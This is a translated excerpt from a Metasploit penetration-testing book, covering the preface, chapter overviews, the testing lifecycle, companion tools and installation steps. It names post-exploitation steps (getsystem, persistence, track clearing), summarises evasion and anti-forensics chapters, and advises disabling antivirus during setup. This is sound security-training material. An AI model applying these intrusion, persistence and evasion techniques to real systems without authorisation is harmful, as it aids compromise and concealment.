# Metasploit 完全指南（一）

> 原文：[`annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E`](https://annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

今天大多数企业都依赖于其 IT 基础设施，而这个 IT 网络中最微小的裂缝都可能导致整个业务崩溃。Metasploit 是一个渗透测试网络，可以通过使用 Metasploit 框架执行复杂的渗透测试来验证您的系统，从而保护您的基础设施。

这个学习路径介绍了 Metasploit 的基本功能和应用。在本书中，您将学习编程 Metasploit 模块的不同技术，以验证诸如数据库、指纹识别和扫描等服务。您将掌握后期利用，并编写快速脚本从被利用的系统中收集信息。随着学习的深入，您将深入探讨现实世界中进行渗透测试的挑战。借助这些案例研究，您将探索使用 Metasploit 进行客户端攻击以及基于 Metasploit 框架构建的各种脚本。

通过学习这个学习路径，您将掌握通过彻底测试来识别系统漏洞所需的技能。

这个学习路径包括以下 Packt 产品的内容：

+   《Metasploit 初学者指南》作者 Sagar Rahalkar

+   《精通 Metasploit-第三版》作者 Nipun Jaswal

# 这本书适合谁

这个学习路径非常适合安全专业人员、Web 程序员和渗透测试人员，他们想要掌握漏洞利用并充分利用 Metasploit 框架。需要具备 Ruby 编程和 Cortana 脚本语言的基础知识。

# 本书涵盖了什么内容

第一章《Metasploit 和支持工具简介》向读者介绍了漏洞评估和渗透测试等概念。读者将了解渗透测试框架的必要性，并对 Metasploit 框架进行简要介绍。此外，本章还解释了 Metasploit 框架如何可以有效地在渗透测试生命周期的各个阶段使用，以及一些扩展 Metasploit 框架功能的支持工具。

第二章《设置您的环境》主要指导如何为 Metasploit 框架设置环境。这包括设置 Kali Linux 虚拟机，独立在各种平台上安装 Metasploit 框架，如 Windows 和 Linux，并在虚拟环境中设置可利用或易受攻击的目标。

第三章《Metasploit 组件和环境配置》涵盖了 Metasploit 框架的结构和解剖，以及各种 Metasploit 组件的介绍。本章还涵盖了本地和全局变量配置，以及保持 Metasploit 框架更新的程序。

第四章《使用 Metasploit 进行信息收集》奠定了使用 Metasploit 框架进行信息收集和枚举的基础。它涵盖了针对各种协议（如 TCP、UDP、FTP、SMB、HTTP、SSH、DNS 和 RDP）的信息收集和枚举。它还涵盖了使用 Shodan 集成进行密码嗅探以及搜索易受攻击系统的高级搜索的 Metasploit 框架的扩展用法。

第五章《使用 Metasploit 进行漏洞搜索》从设置 Metasploit 数据库的说明开始。然后，它提供了使用 NMAP、Nessus 和 Metasploit 框架进行漏洞扫描和利用的见解，并最终介绍了 Metasploit 框架的后期利用能力。

第六章《使用 Metasploit 进行客户端攻击》介绍了与客户端攻击相关的关键术语。然后介绍了使用 msfvenom 实用程序生成自定义有效负载以及社会工程工具包。本章最后介绍了使用 browser_autopwn 辅助模块进行高级基于浏览器的攻击。

第七章《使用 Metasploit 进行 Web 应用程序扫描》涵盖了设置易受攻击的 Web 应用程序的过程。然后介绍了 Metasploit 框架中用于 Web 应用程序漏洞扫描的 wmap 模块，并总结了一些在 Web 应用程序安全评估中有用的其他 Metasploit 辅助模块。

第八章《防病毒和反取证》涵盖了各种避免有效负载被各种防病毒程序检测到的技术。这些技术包括使用编码器、二进制包和加密器。本章还介绍了用于测试有效负载的各种概念，最后总结了 Metasploit 框架的各种反取证功能。

第九章《使用 Armitage 进行网络攻击管理》介绍了一种可以与 Metasploit 框架有效配合使用的网络攻击管理工具“Armitage”，用于执行复杂的渗透测试任务。本章涵盖了 Armitage 工具的各个方面，包括打开控制台、执行扫描和枚举、查找合适的攻击目标以及利用目标。

第十章《扩展 Metasploit 和利用程序开发》介绍了各种利用程序开发概念，以及如何通过添加外部利用程序来扩展 Metasploit 框架。本章最后简要介绍了可以用于自定义利用程序开发的 Metasploit 利用程序模板和混合物。

第十一章《使用 Metasploit 进行渗透测试》带领我们了解使用 Metasploit 进行渗透测试的绝对基础知识。它帮助建立了一种测试方法并设置了测试环境。此外，它系统地介绍了渗透测试的各个阶段。它进一步讨论了使用 Metasploit 相对于传统和手动测试的优势。

第十二章《重新定义 Metasploit》涵盖了构建模块所需的 Ruby 编程基础知识的绝对基础。本章进一步介绍了如何挖掘现有的 Metasploit 模块并编写我们自定义的扫描器、认证测试器、后渗透和凭证收集器模块；最后，它通过对在 RailGun 中开发自定义模块的信息进行阐述。

第十三章《利用制定过程》讨论了通过覆盖利用编写的基本要点来构建利用程序。本章还介绍了模糊测试，并对调试器进行了阐述。然后，它着重于通过分析调试器下应用程序的行为来收集利用所需的要点。最后，它展示了基于收集的信息在 Metasploit 中编写利用程序的过程，并讨论了对保护机制（如 SEH 和 DEP）的绕过。

第十四章《移植利用程序》帮助将公开可用的利用程序转换为 Metasploit 框架。本章重点关注从 Perl/Python、PHP 和基于服务器的利用程序中收集必要的信息，并利用 Metasploit 库和功能将其解释为与 Metasploit 兼容的模块。

*第十五章*，*使用 Metasploit 测试服务*，讨论了在各种服务上执行渗透测试。本章涵盖了 Metasploit 中一些关键模块，这些模块有助于测试 SCADA、数据库和 VOIP 服务。

*第十六章*，*虚拟测试场地和分期*，是关于使用 Metasploit 进行完整渗透测试的简要讨论。本章重点介绍了可以与 Metasploit 一起使用的其他工具，以进行全面的渗透测试。本章继续讨论了流行工具，如 Nmap、Nessus 和 OpenVAS，并解释了如何在 Metasploit 内部使用这些工具。最后讨论了如何生成手动和自动化报告。

*第十七章*，*客户端利用*，将我们的重点转移到客户端利用。本章重点介绍了将传统的客户端利用修改为更复杂和确定的方法。本章从基于浏览器和基于文件格式的利用开始，并讨论了如何 compromise web server 的用户。还解释了如何使用 Metasploit 修改浏览器利用成为致命武器，以及使用 DNS 毒化等向量。最后，本章重点讨论了开发利用 Kali NetHunter 利用 Android 的策略。

*第十八章*，*Metasploit 扩展*，讨论了 Metasploit 的基本和高级后渗透特性。本章讨论了 Meterpreter 有效负载上可用的必要后渗透特性，并继续讨论了高级和强硬的后渗透模块。本章不仅有助于快速了解加快渗透测试过程，还揭示了许多 Metasploit 功能，可以节省相当多的时间，同时编写利用。最后，本章还讨论了自动化后渗透过程。

*第十九章*，*使用 Metasploit 进行逃避*，讨论了 Metasploit 如何使用自定义代码逃避高级保护机制，如使用 Metasploit 有效负载的防病毒解决方案。还概述了如何绕过 Snort 等 IDPS 解决方案的签名，以及如何规避基于 Windows 的目标上的阻止端口。

*第二十章*，*秘密特工的 Metasploit*，讨论了执法机构如何利用 Metasploit 进行操作。本章讨论了代理会话、持久性的独特 APT 方法、从目标系统中清除文件、用于逃避的代码洞技术、使用毒液框架生成不可检测的有效负载，以及如何使用反取证模块在目标系统上不留下痕迹。

*第二十一章*，*使用 Armitage 进行可视化*，专门介绍了与 Metasploit 相关的最受欢迎的 GUI，即 Armitage。本章解释了如何使用 Armitage 扫描目标，然后利用目标。本章还教授了使用 Armitage 进行红队基础知识。此外，还讨论了 Cortana，它用于在 Armitage 中编写自动攻击，以开发虚拟机器人来帮助渗透测试。最后，本章讨论了如何添加自定义功能，并在 Armitage 中构建自定义界面和菜单。

*第二十二章*，*技巧和窍门*，教授了各种技能，可以加快测试速度，并帮助您更有效地使用 Metasploit。

# 要充分利用本书

为了运行本书中的练习，建议使用以下软件：

+   Metasploit 框架

+   PostgreSQL

+   VMWare 或 Virtual Box

+   Kali Linux

+   Nessus

+   7-Zip

+   NMAP

+   W3af

+   Armitage

+   Windows XP

+   Adobe Acrobat Reader

# 下载示例代码文件

您可以从[www.packt.com](http://www.packt.com)的帐户中下载本书的示例代码文件。如果您在其他地方购买了本书，您可以访问[www.packt.com/support](http://www.packt.com/support)注册，以便文件直接通过电子邮件发送给您。

您可以按照以下步骤下载代码文件：

1.  登录或注册[www.packt.com](http://www.packt.com)。

1.  选择“支持”选项卡。

1.  点击“代码下载和勘误”。

1.  在“搜索”框中输入书名，然后按照屏幕上的说明操作。

下载文件后，请确保使用最新版本的解压缩或提取文件夹：

+   WinRAR/7-Zip 适用于 Windows

+   Zipeg/iZip/UnRarX 适用于 Mac

+   7-Zip/PeaZip 适用于 Linux

该书的代码包也托管在 GitHub 上，网址为[`github.com/PacktPublishing/The-Complete-Metasploit-Guide`](https://github.com/PacktPublishing/The-Complete-Metasploit-Guide)。如果代码有更新，将在现有的 GitHub 存储库上进行更新。

我们还有其他代码包，来自我们丰富的图书和视频目录，可在[`github.com/PacktPublishing/`](https://github.com/PacktPublishing/)找到。来看看吧！

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：表示文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 句柄。例如：“我们可以看到我们在`SESSION 1`上使用了`post/windows/manage/inject_host`模块，并将条目插入到目标主机文件中。”

代码块设置如下：

```
 irb(main):001:0> 2
=> 2 
```

任何命令行输入或输出都以以下形式书写：

```
 msf > openvas_config_list
[+] OpenVAS list of configs 
```

**粗体**：表示新术语、重要词或屏幕上看到的词。例如，菜单或对话框中的单词会以这种形式出现在文本中。例如：“点击弹出框中的连接按钮以建立连接。”

警告或重要提示会以这种形式出现。

提示和技巧会出现在这样的形式。


# 第一章：Metasploit 和支持工具的介绍

在我们深入了解 Metasploit 框架的各个方面之前，让我们首先打下一些绝对基础的基础。在本章中，我们将从概念上了解渗透测试的全部内容，以及 Metasploit 框架的确切位置。我们还将浏览一些增强 Metasploit 框架功能的附加工具。在本章中，我们将涵盖以下主题：

+   渗透测试的重要性

+   漏洞评估和渗透测试的区别

+   渗透测试框架的需求

+   Metasploit 的简要介绍

+   了解 Metasploit 在渗透测试的所有阶段中的适用性

+   介绍帮助扩展 Metasploit 功能的支持工具

# 渗透测试的重要性

十多年来，技术的使用呈指数级增长。几乎所有的企业部分或完全依赖于技术的使用。从比特币到云到物联网，每天都会出现新的技术。虽然这些技术完全改变了我们的做事方式，但它们也带来了威胁。攻击者发现了新的创新方式来操纵这些技术以获取乐趣和利润！这是全球数千家组织和企业关注的问题。全球组织深切关注保护其数据的安全。保护数据当然很重要，然而，测试是否已经采取了足够的保护机制同样重要。保护机制可能会失败，因此在有人真正利用它们之前对它们进行测试是一项具有挑战性的任务。话虽如此，漏洞评估和渗透测试已经变得非常重要，并且现在已经在所有合规程序中被包括进去。通过正确进行漏洞评估和渗透测试，组织可以确保已经建立了正确的安全控制，并且它们正在按预期运行！

# 漏洞评估与渗透测试

漏洞评估和渗透测试是两个经常可以互换使用的常见词汇。然而，了解两者之间的区别是很重要的。为了了解确切的区别，让我们考虑一个现实世界的场景：

一个小偷打算抢劫一所房子。为了执行他的抢劫计划，他决定侦察他的目标。他随意访问了他打算抢劫的房子，并试图评估那里有哪些安全措施。他注意到房子的后面有一个经常开着的窗户，很容易破门而入。在我们的术语中，小偷刚刚执行了漏洞评估。现在，几天后，小偷实际上再次去了那所房子，并通过他之前在侦察阶段发现的后面的窗户进入了房子。在这种情况下，小偷对他的目标房子进行了实际的渗透，目的是抢劫。

这正是我们在计算系统和网络的情况下可以相关的。人们可以首先对目标进行漏洞评估，以评估系统的整体弱点，然后再进行计划的渗透测试，以实际检查目标是否容易受攻击。如果不进行漏洞评估，就不可能计划和执行实际的渗透测试。

尽管大多数漏洞评估在性质上是非侵入性的，但如果渗透测试没有受到控制地进行，就可能对目标造成损害。根据特定的合规需求，一些组织选择仅进行漏洞评估，而其他组织则继续进行渗透测试。

# 渗透测试框架的需求

渗透测试不仅仅是针对目标运行一组自动化工具。这是一个涉及多个阶段的完整过程，每个阶段对项目的成功同样重要。现在，为了执行渗透测试的所有阶段中的所有任务，我们需要使用各种不同的工具，可能需要手动执行一些任务。然后，在最后，我们需要将来自许多不同工具的结果结合在一起，以生成一个有意义的报告。这肯定是一项艰巨的任务。如果一个单一的工具可以帮助我们执行渗透测试所需的所有任务，那将会非常简单和节省时间。Metasploit 这样的框架满足了这个需求。

# 介绍 Metasploit

Metasploit 的诞生可以追溯到 14 年前，2003 年，H.D Moore 用 Perl 编写了一个便携式网络工具。到 2007 年，它被重写为 Ruby。当 Rapid7 在 2009 年收购该项目时，Metasploit 项目获得了重大商业推动。Metasploit 本质上是一个强大而多功能的渗透测试框架。它可以在整个渗透测试生命周期中执行所有任务。使用 Metasploit，你真的不需要重新发明轮子！你只需要专注于核心目标；支持性的行动将通过框架的各个组件和模块执行。此外，由于它是一个完整的框架，而不仅仅是一个应用程序，它可以根据我们的需求进行定制和扩展。

毫无疑问，Metasploit 是一个非常强大的渗透测试工具。然而，它绝对不是一个可以帮助你入侵任何给定目标系统的魔术棒。了解 Metasploit 的能力是很重要的，这样在渗透测试期间可以最大限度地利用它。

虽然最初的 Metasploit 项目是开源的，但在被 Rapid7 收购后，商业级别的 Metasploit 版本也出现了。在本书的范围内，我们将使用*Metasploit 框架*版本。

你知道吗？Metasploit 框架有 3000 多个不同的模块可用于利用各种应用程序、产品和平台，这个数字还在不断增长。

# 何时使用 Metasploit？

有成吨的工具可用于执行与渗透测试相关的各种任务。然而，大多数工具只能执行一个独特的目的。与这些工具不同，Metasploit 是一个可以在整个渗透测试生命周期中执行多个任务的工具。在我们检查 Metasploit 在渗透测试中的确切用途之前，让我们简要概述一下渗透测试的各个阶段。以下图表显示了渗透测试生命周期的典型阶段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/681f9281-7466-41a2-a00e-8312ee18ab8f.jpg)

渗透测试生命周期的阶段

1.  **信息收集**：尽管信息收集阶段可能看起来非常琐碎，但它是渗透测试项目成功的最重要阶段之一。你对目标了解得越多，你找到合适的漏洞和利用的机会就越大。因此，值得投入大量时间和精力收集有关范围内目标的尽可能多的信息。信息收集可以分为两种类型，如下所示：

+   **被动信息收集**：被动信息收集涉及通过公开可用的来源（如社交媒体和搜索引擎）收集有关目标的信息。不与目标直接接触。

+   **主动信息收集**：主动信息收集涉及使用专门的工具，如端口扫描器，以获取有关目标系统的信息。它涉及直接与目标系统进行联系，因此可能会被目标网络中的防火墙、IDS 或 IPS 注意到。

1.  **枚举**：使用主动和/或被动信息收集技术，可以初步了解目标系统/网络。进一步进行枚举，可以了解目标系统上运行的确切服务（包括类型和版本）以及其他信息，如用户、共享和 DNS 条目。枚举为我们试图渗透的目标准备了更清晰的蓝图。

1.  **获取访问**：基于我们从信息收集和枚举阶段获得的目标蓝图，现在是时候利用目标系统中的漏洞并获取访问权限了。获取对该目标系统的访问权限涉及利用早期阶段发现的一个或多个漏洞，并可能绕过目标系统中部署的安全控制（如防病毒软件、防火墙、IDS 和 IPS）。

1.  **权限提升**：经常情况下，在目标上利用漏洞只能获得对系统的有限访问。然而，我们希望完全获得对目标的根/管理员级别访问，以便充分利用我们的练习。可以使用各种技术来提升现有用户的权限。一旦成功，我们就可以完全控制具有最高权限的系统，并可能深入渗透到目标中。

1.  **保持访问**：到目前为止，我们已经付出了很多努力，以获得对目标系统的根/管理员级别访问。现在，如果目标系统的管理员重新启动系统会怎样？我们所有的努力将会白费。为了避免这种情况，我们需要为持久访问目标系统做好准备，以便目标系统的任何重新启动都不会影响我们的访问。

1.  **清除痕迹**：虽然我们已经努力利用漏洞、提升权限，并使我们的访问持久化，但我们的活动很可能已经触发了目标系统的安全系统的警报。事件响应团队可能已经在行动，追踪可能导致我们的所有证据。根据约定的渗透测试合同条款，我们需要清除在妥协期间上传到目标上的所有工具、漏洞和后门。

有趣的是，Metasploit 实际上在所有先前列出的渗透测试阶段中帮助我们。

以下表格列出了各种 Metasploit 组件和模块，可在渗透测试的所有阶段使用：

| **序号** | **渗透测试阶段** | **Metasploit 的使用** |
| --- | --- | --- |
| 1 | 信息收集 | `辅助模块：portscan/syn`, `portscan/tcp, smb_version`, `db_nmap`, `scanner/ftp/ftp_version`, 和 `gather/shodan_search` |
| 2 | 枚举 | `smb/smb_enumshares`, `smb/smb_enumusers`, 和 `smb/smb_login` |
| 3 | 获取访问 | 所有 Metasploit 漏洞利用和有效载荷 |
| 4 | 权限提升 | `meterpreter-use priv` 和 `meterpreter-getsystem` |
| 5 | 保持访问 | `meterpreter - run persistence` |
| 6 | 清除痕迹 | Metasploit 反取证项目 |

我们将在书中逐步涵盖所有先前的组件和模块。

# 使用补充工具使 Metasploit 更加有效和强大

到目前为止，我们已经看到 Metasploit 确实是一个强大的渗透测试框架。然而，如果与其他一些工具集成，它可以变得更加有用。本节介绍了一些补充 Metasploit 功能的工具。

# Nessus

Nessus 是 Tenable Network Security 的产品，是最受欢迎的漏洞评估工具之一。它属于漏洞扫描仪类别。它非常容易使用，并且可以快速发现目标系统中的基础架构级漏洞。一旦 Nessus 告诉我们目标系统上存在哪些漏洞，我们就可以将这些漏洞提供给 Metasploit，以查看它们是否可以被真正利用。

它的官方网站是[`www.tenable.com/`](https://www.tenable.com/)。以下图片显示了 Nessus 首页：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f9d3aabf-4776-453f-88e5-757aaeb9e523.jpg)

Nessus 用于启动漏洞评估的 Web 界面

以下是 Nessus 的不同基于操作系统的安装步骤：

+   **在 Windows 上安装**：

1.  转到 URL[`www.tenable.com/products/nessus/select-your-operating-system.`](https://www.tenable.com/products/nessus/select-your-operating-system)

1.  在 Microsoft Windows 类别下，选择适当的版本（32 位/64 位）。

1.  下载并安装`msi`文件。

1.  打开浏览器，转到 URL[`localhost:8834/.`](https://localhost:8834/)

1.  设置新的用户名和密码以访问 Nessus 控制台。

1.  要注册，请单击注册此扫描仪选项。

1.  访问[`www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code`](http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code)，选择 Nessus Home 并输入您的注册详细信息。

1.  输入您在电子邮件中收到的注册码。

+   **在 Linux 上安装（基于 Debian）：**

1.  转到 URL[`www.tenable.com/products/nessus/select-your-operating-system.`](https://www.tenable.com/products/nessus/select-your-operating-system)

1.  在 Linux 类别下，选择适当的版本（32 位/AMD64）。

1.  下载文件。

1.  打开终端并浏览到您下载安装程序（`.deb`）文件的文件夹。

1.  键入命令`dpkg -i <name_of_installer>.deb`。

1.  打开浏览器，转到 URL[`localhost:8834/.`](https://localhost:8834/)

1.  设置新的用户名和密码以访问 Nessus 控制台。

1.  要注册，请单击注册此扫描仪选项。

1.  访问[`www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code`](http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code)，选择 Nessus Home 并输入您的注册详细信息。

1.  输入您在电子邮件中收到的注册码。

# NMAP

NMAP（Network Mapper 的缩写）是用于网络信息收集的事实标准工具。它属于信息收集和枚举类别。乍一看，它可能看起来很小，很简单。但是，它是如此全面，以至于可以专门撰写一本完整的书来介绍如何根据我们的要求调整和配置 NMAP。NMAP 可以快速概述目标网络中所有开放的端口和正在运行的服务。这些信息可以提供给 Metasploit 进行进一步操作。虽然本书不涵盖 NMAP 的详细讨论，但我们将在后面的章节中涵盖 NMAP 的所有重要方面。

它的官方网站是[`nmap.org/.`](https://nmap.org/)以下屏幕截图显示了 NMAP 扫描的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9198fb14-0db4-4547-a598-54073d0d33e0.jpg)

使用命令行界面进行 NMAP 扫描的示例

尽管访问 NMAP 的最常见方式是通过命令行，但 NMAP 也有一个名为 Zenmap 的图形界面，它是 NMAP 引擎上的简化界面，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/85a17256-5bfa-4f34-9bf2-d934f79c5ca5.jpg)

NMAP 的 Zenmap 图形用户界面（GUI）

以下是 NMAP 的不同基于操作系统的安装步骤：

+   **在 Windows 上安装：**

1.  转到网站[`nmap.org/download.html.`](https://nmap.org/download.html)

1.  在 Microsoft Windows Binaries 部分，选择最新版本（.exe）文件。

1.  安装下载的文件以及 WinPCAP（如果尚未安装）。

WinPCAP 是一个程序，运行诸如 NMAP、Nessus 和 Wireshark 之类的工具时需要它。它包含一组库，允许其他应用程序捕获和传输网络数据包。

+   **在 Linux 上（基于 Debian）的安装：** NMAP 默认安装在 Kali Linux 上；但是，如果没有安装，可以使用以下命令进行安装：

`root@kali:~#apt-get install nmap`

# w3af

w3af 是一个开源的 Web 应用程序安全扫描工具。它属于 Web 应用程序安全扫描器类别。它可以快速扫描目标 Web 应用程序，查找常见的 Web 应用程序漏洞，包括 OWASP 前 10 名。w3af 还可以有效地与 Metasploit 集成，使其更加强大。

它的官方网站是[`w3af.org/.`](http://w3af.org/) 我们可以在以下图片中看到 w3af 控制台用于扫描 Web 应用程序漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1488e5d2-ef39-4069-a609-55aac859ad2d.jpg)

w3af 控制台用于扫描 Web 应用程序漏洞

以下是 w3af 的基于各种操作系统的安装步骤：

+   **在 Windows 上安装：** w3af 不适用于 Windows 平台

+   **在 Linux 上（基于 Debian）的安装：** w3af 默认安装在 Kali Linux 上；但是，如果没有安装，可以使用以下命令进行安装：

`root@kali:~# apt-get install w3af`

# Armitage

Armitage 是一个利用自动化框架，它在后台使用 Metasploit。它属于利用自动化类别。它提供了一个易于使用的用户界面，用于在网络中查找主机、扫描、枚举、查找漏洞，并利用 Metasploit 的漏洞和有效载荷对它们进行利用。我们将在本书的后面详细介绍 Armitage。

它的官方网站是[`www.fastandeasyhacking.com/index.html.`](http://www.fastandeasyhacking.com/index.html) [我们可以在以下截图中看到 Armitage 控制台用于利用自动化：](http://w3af.org/)

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/231526db-b159-485e-8c4a-0be57af67b77.jpg)

Armitage 控制台用于利用自动化。

以下是 Armitage 的基于各种操作系统的安装步骤：

+   **在 Windows 上安装：** Armitage 不支持 Windows

+   **在 Linux 上（基于 Debian）的安装：** Armitage 默认安装在 Kali Linux 上；但是，如果没有安装，可以使用以下命令进行安装：

`root@kali:~# apt-get install armitage`

要设置和运行 Armitage，需要 PostgreSQL、Metasploit 和 Java。但是，这些已经安装在 Kali Linux 系统上。

# 总结

现在我们已经对 Metasploit 的概述有了一个高层次的了解，它在渗透测试中的适用性以及支持工具，我们将在下一章中浏览 Metasploit 的安装和环境设置。

# 练习

您可以尝试以下练习：

+   访问 Metasploit 的官方网站，尝试了解各个版本的 Metasploit 之间的区别

+   尝试探索更多关于 Nessus 和 NMAP 如何在渗透测试中帮助我们的信息。


# 第二章：设置您的环境

在前一章中，您简要了解了漏洞评估、渗透测试和 Metasploit Framework。现在，让我们通过学习如何在各种平台上安装和设置框架以及设置专用虚拟测试环境来实际开始使用 Metasploit。在本章中，您将学习以下主题：

+   使用 Kali Linux 虚拟机立即开始使用 Metasploit 和支持工具

+   在 Windows 和 Linux 平台上安装 Metasploit Framework

+   在虚拟环境中设置可利用的目标

# 使用 Kali Linux 虚拟机-最简单的方法

Metasploit 是由 Rapid7 分发的独立应用程序。它可以在 Windows 和 Linux 等各种操作系统平台上单独下载和安装。但是，有时 Metasploit 还需要许多支持工具和实用程序。在任何给定的平台上单独安装 Metasploit Framework 和所有支持工具可能会有点繁琐。为了简化设置 Metasploit Framework 以及所需工具的过程，建议获取一个现成的 Kali Linux 虚拟机。

使用此虚拟机将带来以下好处：

+   即插即用的 Kali Linux--无需安装

+   Metasploit 预先安装在 Kali VM 中

+   所有支持的工具（本书中讨论的）也预先安装在 Kali VM 中

+   节省设置 Metasploit 和其他支持工具的时间和精力

要使用 Kali Linux 虚拟机，您首先需要在系统上安装 VirtualBox、VMPlayer 或 VMware Workstation。

以下是使用 Kali Linux VM 入门的步骤：

1.  从[`www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/`](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/)下载 Kali Linux 虚拟机。

1.  根据基本操作系统的类型选择并下载 Kali Linux 64 位 VM 或 Kali Linux 32 位 VM PAE，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f1b7585e-940a-4536-8020-6c5c15032330.jpg)

1.  一旦虚拟机下载完成，从 Zip 文件中提取到您选择的任何位置。

1.  双击 VMware 虚拟机配置文件以打开虚拟机，然后播放虚拟机。以下凭据可用于登录虚拟机：

```
Username - root
 Password - toor
```

1.  要启动 Metasploit Framework，请打开终端并输入`msfconsole`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a9c6362d-a70d-45f9-8bcd-b215b7f8b8a0.jpg)

# 在 Windows 上安装 Metasploit

Metasploit Framework 可以轻松安装在基于 Windows 的操作系统上。但是，Windows 通常不是部署 Metasploit Framework 的首选平台，原因是许多支持工具和实用程序在 Windows 平台上不可用。因此，强烈建议在 Linux 平台上安装 Metasploit Framework。

在 Windows 上安装 Metasploit Framework 的步骤如下：

1.  从[`github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version`](https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version)下载最新的 Metasploit Windows 安装程序。

1.  双击并打开下载的安装程序。

1.  单击“下一步”，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c5d0872f-39f0-41ab-9561-a04255989c71.jpg)

1.  接受许可协议：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7bd98385-68a4-43ae-bcd7-c3b7719fac55.jpg)

1.  选择您希望安装 Metasploit Framework 的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/818d5686-5287-4303-9603-c76824a942ce.jpg)

1.  单击“安装”以继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a0f33f65-653f-4ab9-be00-4592f5bc40f3.jpg)

Metasploit 安装程序通过将所需文件复制到目标文件夹来进行进展：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ea6bc98d-f2df-40ae-ba73-b0d7a1b42b43.jpg)

1.  单击“完成”以完成 Metasploit Framework 的安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/35d2dbc0-0e5e-430a-91e7-58564259a6ec.jpg)

现在安装完成，让我们尝试通过命令行界面访问 Metasploit Framework：

1.  按下*Windows 键* + *R*。

1.  输入`cmd`并按*Enter*。

1.  使用`cd`，导航到您安装 Metasploit Framework 的文件夹/路径。

1.  输入`msfconsole`并按*Enter*；您应该能够看到以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c7337bf2-a885-4e28-960e-0bf4e47473bf.jpg)

# 在 Linux 上安装 Metasploit

在本书的范围内，我们将在 Ubuntu（基于 Debian）系统上安装 Metasploit Framework。在开始安装之前，我们首先需要下载最新的安装程序。可以使用`wget`命令完成如下：

1.  打开一个终端窗口，输入：

```
wgethttp://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1c50fb00-0939-4cec-971c-05bc063c9384.png)

1.  一旦安装程序已下载，我们需要更改安装程序的模式为可执行。可以按照以下步骤完成：

+   对于 64 位系统：`chmod +x /path/to/metasploit-latest-linux-x64-installer.run`

+   对于 32 位系统：``chmod +x /path/to/metasploit-latest-linux-installer.run``

1.  现在我们准备使用以下命令启动安装程序：

+   对于 64 位系统：`sudo /path/to/metasploit-latest-linux-x64-installer.run`

+   对于 32 位系统：`sudo /path/to/metasploit-latest-linux-installer.run`

1.  我们可以看到以下安装程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4535441e-24d5-4442-9bc8-5d40c0256b96.png)

1.  接受许可协议：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ca94682d-c194-4d00-bdf4-89bf26fcc229.png)

1.  选择安装目录（建议将其保持默认安装的*不变*）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ff36940f-329a-40fe-8052-210950416f4e.png)

1.  选择“是”将 Metasploit Framework 安装为服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/afe8914a-b256-4bdc-880d-e0964652e130.png)

1.  确保禁用系统上可能已经运行的任何防病毒软件或防火墙。诸如防病毒软件和防火墙之类的安全产品可能会阻止许多 Metasploit 模块和漏洞利用正确运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/74368207-4712-4be3-b11e-070aac1e6467.png)

1.  输入 Metasploit 服务将运行的端口号。（建议将其保持默认安装的*不变*）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1a4b0d94-25b3-412d-a9ef-ea1b5d822c3e.png)

1.  输入 Metasploit Framework 将运行的主机名。（建议将其保持默认安装的*不变*）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c28f9dc0-9a15-4e75-b435-6bdca653498c.png)

1.  单击“前进”以继续安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5b0242c9-a455-4e6b-96ba-e519d5945437.png)![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ea203a09-d89a-469a-928b-c503838ec823.png)

1.  现在 Metasploit Framework 安装已完成：

